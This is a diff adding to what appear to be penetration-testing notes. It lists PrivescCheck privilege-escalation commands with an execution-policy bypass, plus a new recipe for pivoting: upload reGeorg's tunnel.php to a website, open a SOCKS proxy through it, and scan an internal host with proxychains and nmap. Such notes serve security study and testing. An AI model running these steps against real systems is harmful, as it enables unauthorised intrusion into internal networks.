@@ -257,7 +257,19 @@ Which function in PrivescCheck helps in identifying user privileges that could p
 C:> powershell.exe -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 C:> runas.exe /user:administrator cmd (Calling cmd with administrator privilege from PowerShell)
 ____________________________________________________________________________________________________________________________________
+Pivoting with ReGeorg
+---------------------
+Git clone to that repo
+https://github.com/sensepost/reGeorg/tree/master
 
+1.Need to have file uploading function in website.
+2.Upload tunnel.php file
+3.python reGeorgSocksProxy.py -p 9050 -u http://192.139.178.3/public/tunnel.php (file uplading path)
+
+Pivoting is finished
+
+#proxychains nmap -sV -sC -Pn 192.168.22.3(internal IP) 
+____________________________________________________________________________________________________________________________________
 
 
 
